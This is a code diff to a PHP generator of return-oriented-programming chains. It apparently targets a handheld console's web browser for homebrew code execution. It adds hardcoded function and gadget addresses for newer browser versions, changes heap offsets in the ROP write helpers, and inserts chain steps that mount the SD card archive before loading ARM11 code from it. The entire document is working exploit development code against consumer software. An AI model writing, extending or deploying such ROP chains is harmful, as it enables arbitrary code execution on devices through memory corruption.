@@ -631,6 +631,12 @@ else if($browserver >= 0x80)
 	$ROP_MEMSETOTHER = $WEBKITCRO_MAPADR+0x4da9ac;
 }
 
+if($browserver>=0x80)
+{
+	if($browserver==0x80)$FS_MOUNTSDMC = 0x003168ec;//r0 = archivename*
+	if($browserver==0x81)$FS_MOUNTSDMC = 0x003171c4;
+}
+
 $STACKPIVOT = genu32_unicode_jswrap($STACKPIVOT_ADR);
 $POPLRPC = $STACKPIVOT_ADR + 0x18;//"pop {lr}" "pop {pc}"
 
@@ -1007,16 +1013,19 @@ function ropgen_writeregdata($addr, $data, $pos)
 
 function ropgen_writeregdata_wrap($addr, $data, $pos, $size)//write the u32s from array $data starting at index $pos, to $addr with byte-size $size.
 {
-	global $ROPHEAP, $ROP_MEMCPY, $POPPC;
+	global $ROPHEAP, $ROP_MEMCPY, $POPPC, $browserver;
 
 	$total_entries = $size / 4;
 	$curpos = 0;
+	$heap_addpos = 0x4;
+
+	if($browserver>=0x80)$heap_addpos = 0;
 
 	while($total_entries - $curpos >= 12)
 	{
 		ropgen_writeregdata($ROPHEAP+0x10, $data, $pos + $curpos);
 
-		ropgen_callfunc($addr, $ROPHEAP+0x14, 0x30, 0x0, $POPPC, $ROP_MEMCPY);
+		ropgen_callfunc($addr, $ROPHEAP+0x10+$heap_addpos, 0x30, 0x0, $POPPC, $ROP_MEMCPY);
 
 		$curpos+= 12;
 		$addr+= 0x30;
@@ -1040,7 +1049,7 @@ function ropgen_writeregdata_wrap($addr, $data, $pos, $size)//write the u32s fro
 	}
 
 	ropgen_writeregdata($ROPHEAP+0x10, $tmpdata, 0);
-	ropgen_callfunc($addr, $ROPHEAP+0x14, 0x30, 0x0, $POPPC, $ROP_MEMCPY);
+	ropgen_callfunc($addr, $ROPHEAP+0x10+$heap_addpos, 0x30, 0x0, $POPPC, $ROP_MEMCPY);
 }
 
 function ropgen_ldm_r0r3($ldm_addr, $stm_addr)
@@ -1449,7 +1458,7 @@ function generateropchain_type1()
 
 function generateropchain_type2()
 {
-	global $ROPHEAP, $ROPCHAIN, $POPLRPC, $POPPC, $ROP_POP_R0R6PC, $ROP_POP_R1R5PC, $OSSCRO_HEAPADR, $OSSCRO_MAPADR, $APPHEAP_PHYSADDR, $svcControlMemory, $ROP_MEMSETOTHER, $IFile_Open, $IFile_Read, $IFile_Write, $IFile_Close, $IFile_GetSize, $IFile_Seek, $GSP_FLUSHDCACHE, $GXLOW_CMD4, $svcSleepThread, $THROW_FATALERR, $SRVPORT_HANDLEADR, $SRV_REFCNT, $srvpm_initialize, $srv_shutdown, $srv_GetServiceHandle, $GSP_WRITEHWREGS, $GSPGPU_SERVHANDLEADR, /*$APT_PrepareToDoApplicationJump,*/ $APT_DoApplicationJump, $arm11code_loadfromsd, $browserver;
+	global $ROPHEAP, $ROPCHAIN, $POPLRPC, $POPPC, $ROP_POP_R0R6PC, $ROP_POP_R1R5PC, $OSSCRO_HEAPADR, $OSSCRO_MAPADR, $APPHEAP_PHYSADDR, $svcControlMemory, $ROP_MEMSETOTHER, $IFile_Open, $IFile_Read, $IFile_Write, $IFile_Close, $IFile_GetSize, $IFile_Seek, $GSP_FLUSHDCACHE, $GXLOW_CMD4, $svcSleepThread, $THROW_FATALERR, $SRVPORT_HANDLEADR, $SRV_REFCNT, $srvpm_initialize, $srv_shutdown, $srv_GetServiceHandle, $GSP_WRITEHWREGS, $GSPGPU_SERVHANDLEADR, /*$APT_PrepareToDoApplicationJump,*/ $APT_DoApplicationJump, $arm11code_loadfromsd, $browserver, $FS_MOUNTSDMC;
 
 	$LINEAR_TMPBUF = 0x18B40000;
 	$LINEAR_VADDRBASE = 0x14000000;
@@ -1471,6 +1480,14 @@ function generateropchain_type2()
 	ropgen_callfunc(0x1ED02A04-0x1EB00000, $ROPHEAP, 0x4, 0x0, $POPPC, $GSP_WRITEHWREGS);//Set the sub-screen colorfill reg so that yellow is displayed.
 
 	ropgen_callfunc($LINEAR_TMPBUF, 0x11000, 0x0, 0x0, $POPPC, $ROP_MEMSETOTHER);
+
+	if($arm11code_loadfromsd>=1 && $browserver>=0x80)//Open sdmc archive when running under SKATER.
+	{
+		ropgen_writeu32($ROPHEAP, 0x636d6473, 0, 1);
+		ropgen_writeu32($ROPHEAP+4, 0x3a, 0, 1);
+		ropgen_callfunc($ROPHEAP, 0x0, 0x0, 0x0, $POPPC, $FS_MOUNTSDMC);
+		ropgen_condfatalerr();
+	}
 
 	if($arm11code_loadfromsd==0)
 	{
@@ -1610,7 +1627,7 @@ function generateropchain_type2()
 
 function generateropchain_type3()
 {
-	global $ROPHEAP, $ROPCHAIN, $POPLRPC, $POPPC, $ROP_POP_R0R6PC, $ROP_POP_R1R5PC, $ROP_MEMSETOTHER, $IFile_Open, $IFile_Read, $IFile_Write, $IFile_Close, $IFile_GetSize, $IFile_Seek, $THROW_FATALERR, $SRVPORT_HANDLEADR, $SRV_REFCNT, $srvpm_initialize, $srv_shutdown, $srv_GetServiceHandle, $READ_EXEFSFILE, $OPENFILEDIRECTLY_WRAP, $FSFILEIPC_CLOSE, $FSFILEIPC_GETSIZE, $FSFILEIPC_READ, $GSP_WRITEHWREGS, $browserver;
+	global $ROPHEAP, $ROPCHAIN, $POPLRPC, $POPPC, $ROP_POP_R0R6PC, $ROP_POP_R1R5PC, $ROP_MEMSETOTHER, $IFile_Open, $IFile_Read, $IFile_Write, $IFile_Close, $IFile_GetSize, $IFile_Seek, $THROW_FATALERR, $SRVPORT_HANDLEADR, $SRV_REFCNT, $srvpm_initialize, $srv_shutdown, $srv_GetServiceHandle, $READ_EXEFSFILE, $OPENFILEDIRECTLY_WRAP, $FSFILEIPC_CLOSE, $FSFILEIPC_GETSIZE, $FSFILEIPC_READ, $GSP_WRITEHWREGS, $browserver, $arm11code_loadfromsd, $FS_MOUNTSDMC;
 
 	$IFile_ctx = $ROPHEAP+0x80;
 	$FILEBUF = 0x18B40000;
@@ -1627,6 +1644,14 @@ function generateropchain_type3()
 	ropgen_callfunc($FILEBUF, 0x00200000+8, 0x0, 0x0, $POPPC, $ROP_MEMSETOTHER);
 
 	ropgen_callfunc($IFile_ctx, 0x14, 0x0, 0x0, $POPPC, $ROP_MEMSETOTHER);//Clear the IFile ctx.
+
+	if($arm11code_loadfromsd>=1 && $browserver>=0x80)//Open sdmc archive when running under SKATER.
+	{
+		ropgen_writeu32($ROPHEAP, 0x636d6473, 0, 1);
+		ropgen_writeu32($ROPHEAP+4, 0x3a, 0, 1);
+		ropgen_callfunc($ROPHEAP, 0x0, 0x0, 0x0, $POPPC, $FS_MOUNTSDMC);
+		ropgen_condfatalerr();
+	}
 
 	$databuf = array();
 	$databuf[0] = 0x640073;//utf16 string: "sdmc:/dump.bin"
